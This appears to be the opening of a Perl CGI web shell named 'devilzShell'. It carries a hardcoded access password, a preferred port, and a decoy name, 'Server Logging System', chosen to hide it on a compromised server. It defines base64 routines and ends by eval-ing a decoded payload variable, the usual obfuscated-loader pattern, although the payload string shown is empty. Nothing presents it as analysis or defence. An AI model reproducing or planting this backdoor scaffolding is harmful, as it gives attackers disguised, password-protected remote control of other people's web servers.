#!/usr/bin/perl
##
## devilzShell <[cgi]>
## ^^^^^^^^^^^^
## author: b374k
## greets: devilzc0der(s) and all of you who love peace and freedom
##
##
## ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
## Jayalah Indonesiaku


$shell_name = "devilzShell";
$shell_fake_name = "Server Logging System";
$shell_title = " :: ".$shell_name." ::";
$shell_version = "v1";
$shell_password = "devilzc0der";
$shell_fav_port = "12345";
$shell_color = "#374374";
$shell_code = "";$base64_alphabet='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';$base64_pad='=';$uuencode_alphabet = q|`!"#$%&'()*+,-./0123456789:;<=>?|.'@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_';$uuencode_pad='`';$tr_uuencode=" ".$uuencode_alphabet;$tr_uuencode=~s/(\W)/\\$1/g;$tr_base64="A".$base64_alphabet;$tr_base64=~s/(\W)/\\$1/g;sub b64decode{local($_)=@_;local($result);eval qq{tr|$tr_base64||cd;tr|$tr_base64|$tr_uuencode|;};while(s/^(.{60})//){$result.=unpack("u", "M".$&);}if($_ ne ""){$result.=unpack("u",substr($uuencode_alphabet, length($_)*3/4,1).$_);}return $result;}sub b64encode{local ($_) = @_;local ($chunk);local ($result);while (s/^((.|\n){45})//){$chunk = substr(pack("u", $&), $[+1, 60);eval qq{ \$chunk =~ tr|$tr_uuencode|$tr_base64|;};$result.=$chunk."\n";}if($_ ne ""){$chunk=substr(pack("u", $_),$[+1,int((length($_)+2)/3)*4-(45-length($_))%3);eval qq{ \$chunk =~ tr|$tr_uuencode|$tr_base64|;};$result.=$chunk.($base64_pad x ((60-length($chunk))%4))."\n";}$result;}eval(b64decode($shell_code));